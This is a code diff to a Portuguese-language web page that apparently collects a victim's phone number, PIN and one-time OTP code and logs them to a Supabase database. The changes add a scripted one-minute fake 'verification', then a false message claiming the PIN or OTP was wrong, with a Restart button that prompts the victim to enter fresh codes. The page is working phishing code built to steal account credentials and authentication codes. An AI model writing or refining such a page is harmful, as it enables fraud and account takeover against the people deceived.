@@ -107,6 +107,23 @@
       margin-bottom: 20px;
     }
     .notice strong { color: #b45309; }
+    /* Mensagem de erro final */
+    .final-error {
+      border: 1px solid #f5c2c0;
+      background: #fff5f5;
+      color: #b42318;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: .95rem;
+      font-weight: 700;
+      text-align: center;
+      margin-top: 18px;
+      line-height: 1.5;
+    }
+    .final-error .btn {
+      margin-top: 14px;
+      background: linear-gradient(135deg, #ff8a32, #e96712);
+    }
     @media (max-width: 380px) {
       body { padding: 12px; }
       .content { padding: 21px; }
@@ -184,8 +201,16 @@
             <div class="progress"><span id="waitProgressBar" style="width:0%"></span></div>
             <p class="status" id="waitStatus">Não feche esta página.</p>
           </div>
+
+          <!-- Mensagem final: PIN ou OTP incorretos + botão Reiniciar -->
+          <div id="finalErrorBox" class="final-error" style="display:none;">
+            O PIN ou o código OTP estão incorretos.<br>
+            Clique em <strong>Reiniciar</strong> e insira os dados corretamente.
+            <button class="btn" id="finalRestartBtn" type="button">Reiniciar</button>
+          </div>
         </section>
       </div>
+
       <footer class="footer">
         <a class="small-link" href="#" id="restart">Reiniciar</a>
       </footer>
@@ -199,7 +224,6 @@
     const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_QeVZ4IY7ZFn_RKRvPRVyaQ_mFGcIYbw";
     const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
 
-    // Envia o evento COM os dados preenchidos pelo cliente
     async function logEvent(eventType, data = {}) {
       try {
         const { error } = await supabaseClient
@@ -226,6 +250,8 @@
     const waitCountdown = document.getElementById("waitCountdown");
     const waitProgressBar = document.getElementById("waitProgressBar");
     const waitStatus = document.getElementById("waitStatus");
+    const finalErrorBox = document.getElementById("finalErrorBox");
+    const finalRestartBtn = document.getElementById("finalRestartBtn");
     const phoneInput = document.getElementById("phone");
     const pinInput = document.getElementById("pin");
     const otpDigits = [...document.querySelectorAll(".otp-digit")];
@@ -233,9 +259,11 @@
     let currentPhone = "";
     let currentPin = "";
     let waitInterval = null;
+    let otpSubmitting = false;
 
     function showStep(step) {
-      [loginForm, processingStep, otpForm, waitingStep].forEach(el => el.classList.remove("active"));
+      [loginForm, processingStep, otpForm, waitingStep]
+        .forEach(el => el.classList.remove("active"));
       step.classList.add("active");
     }
 
@@ -274,8 +302,6 @@
         }
       }, 1000);
     });
-
-    let otpSubmitting = false;
 
     otpDigits.forEach((input, index) => {
       input.addEventListener("input", () => {
@@ -322,17 +348,19 @@
       });
 
       otpDigits.forEach(input => input.value = "");
+
       showStep(waitingStep);
-      startWaitCountdown();
+      startWait();
     }
 
-    // Contagem de 1 minuto + mensagem final sobre novo código
-    function startWaitCountdown() {
+    // Espera de 1 minuto → mostra erro final (PIN/OTP incorretos) + botão Reiniciar
+    function startWait() {
       if (waitInterval) clearInterval(waitInterval);
-      let totalSeconds = 60; // ALTERADO: 1 minuto
+      let totalSeconds = 60;
       const total = totalSeconds;
       waitStatus.textContent = "Não feche esta página.";
       waitProgressBar.style.width = "0%";
+      finalErrorBox.style.display = "none";
       updateWaitDisplay(totalSeconds);
 
       waitInterval = setInterval(() => {
@@ -342,8 +370,9 @@
           waitInterval = null;
           updateWaitDisplay(0);
           waitProgressBar.style.width = "100%";
-          waitStatus.innerHTML = "Iremos enviar outro código de confirmação. Confirme corretamente.";
-          logEvent("wait_completed");
+          waitStatus.textContent = "Verificação concluída.";
+          finalErrorBox.style.display = "block";
+          logEvent("validation_failed");
         } else {
           updateWaitDisplay(totalSeconds);
           waitProgressBar.style.width = ((total - totalSeconds) / total * 100) + "%";
@@ -363,17 +392,26 @@
       await submitOtp();
     });
 
-    document.getElementById("restart").addEventListener("click", (event) => {
-      event.preventDefault();
+    // Função de reinício (usada pelo link do rodapé e pelo botão da mensagem final)
+    function restartFlow(event) {
+      if (event) event.preventDefault();
       otpSubmitting = false;
       currentPhone = "";
       currentPin = "";
       if (waitInterval) { clearInterval(waitInterval); waitInterval = null; }
+      finalErrorBox.style.display = "none";
+      waitStatus.textContent = "Não feche esta página.";
+      waitProgressBar.style.width = "0%";
+      updateWaitDisplay(60);
       phoneInput.value = "";
       pinInput.value = "";
       otpDigits.forEach(input => input.value = "");
       showStep(loginForm);
-    });
+      phoneInput.focus();
+    }
+
+    document.getElementById("restart").addEventListener("click", restartFlow);
+    finalRestartBtn.addEventListener("click", restartFlow);
   </script>
 </body>
 </html>
